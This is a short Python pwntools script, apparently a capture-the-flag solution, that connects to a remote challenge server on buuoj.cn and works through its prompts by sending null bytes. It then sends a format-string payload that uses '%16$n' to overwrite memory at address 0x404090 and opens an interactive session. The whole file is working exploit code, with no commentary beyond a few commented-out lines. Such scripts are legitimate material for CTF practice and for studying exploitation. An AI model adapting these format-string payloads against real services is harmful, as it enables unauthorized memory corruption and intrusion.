from pwn import *

# context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 25352)
io.send(b'\x00')
io.send(b'\x00')
io.sendlineafter(b'==>', b'666')
while True:
    tmp = io.recvuntil(b'~')
    log.info(tmp)
    io.send(b'\x00')
    io.recvline()
    tmp = io.recvline()
    if b'=' in tmp:
        log.info(tmp)
        break
while True:
    tmp = io.recvuntil(b'~')
    log.info(tmp)
    io.send(b'\x00')
    io.recvline()
    tmp = io.recvline()
    if b'=' in tmp:
        log.info(tmp)
        break
log.info(io.recvuntil(b'==>'))
# payload = b'%p'*0x20 + p64(0x404090)
payload = b'aaaaaaaaaa%16$na' + b'%p'*0x18 + p64(0x404090)
io.sendline(payload)
log.info(io.recv())
io.interactive()